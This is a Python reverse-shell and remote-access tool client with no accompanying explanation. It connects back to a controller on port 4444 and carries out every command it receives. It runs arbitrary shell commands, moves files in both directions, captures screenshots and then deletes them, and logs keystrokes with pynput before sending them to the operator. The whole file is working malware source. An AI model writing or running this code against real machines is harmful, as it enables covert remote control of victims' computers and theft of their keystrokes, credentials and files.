#!/usr/bin/env python3

import os
import socket
import subprocess
import json
import cv2
import numpy as np
import pyautogui
import platform
import time
import threading
import pynput
from pynput.keyboard import Key,Listener

host = "127.0.0.1"
port = 4444
keys = ""

def reliable_send(client,data):
    jsonData = json.dumps(data)
    client.send(jsonData.encode())

def reliable_recv(client):
    jsonData = ""
    while True:
        try:
            jsonData = jsonData + client.recv(1024).decode()
            return json.loads(jsonData)
        except ValueError:
            continue

def upload(client,fileName):
    f = open(fileName,"wb")
    client.settimeout(1)
    chunk = client.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = client.recv(1024)
        except socket.timeout as e:
            break
    client.settimeout(None)
    f.close()

def download(client,fileName):
    f = open(fileName,"rb")
    client.send(f.read())

def screenshot(path):
    image = pyautogui.screenshot()
    image = cv2.cvtColor(np.array(image),cv2.COLOR_RGB2BGR)
    cv2.imwrite(path, image)

def pressed(key):
    global keys
    keys = keys + str(key)

def keylog():
    global l
    l = Listener(on_press=pressed)
    l.start()

def pathTempFolder(os):
    if os == "Linux":
        path = "/tmp/"
    if os == "Windows":
        temPath = shell("echo %temp%")
        path = str(temPath).strip() + "\\"
    return path

def checkOS():
	os = platform.system()
	return os

def shell(cmd):
    result = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
    output,error = result.communicate()
    return output.decode()

client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect((host,port))

while True:
    try:
        cmd = reliable_recv(client)
        if cmd == "exit":
            break
        elif cmd[:6] == "upload":
            fileName = cmd.split(" ")[2]
            upload(client,fileName)
        elif cmd[:8] == "download":
            fileName = cmd.split(" ")[1]
            print(fileName)
            download(client,fileName)
        elif cmd[:2] == "cd" and len(cmd) > 3:
            os.chdir(cmd[3:])
            time.sleep(3)
        elif cmd == "keylog":
            t1 = threading.Thread(target=keylog)
            t1.start()
        elif cmd == "screenshot":
            os = checkOS()
            path = pathTempFolder(os) + "temp.jpg"
            screenshot(path)
            download(client,path)
            time.sleep(2)
            if os == "Linux":
                shell("rm " + path)
            if os == "Windows":
                shell("del " + path)
        elif cmd == "stop":
            l.stop()
            t1.join()
            reliable_send(client,keys)
            keys = ""
        else:
            output = shell(cmd)
            reliable_send(client,output)
    except KeyboardInterrupt:
        break
client.close()
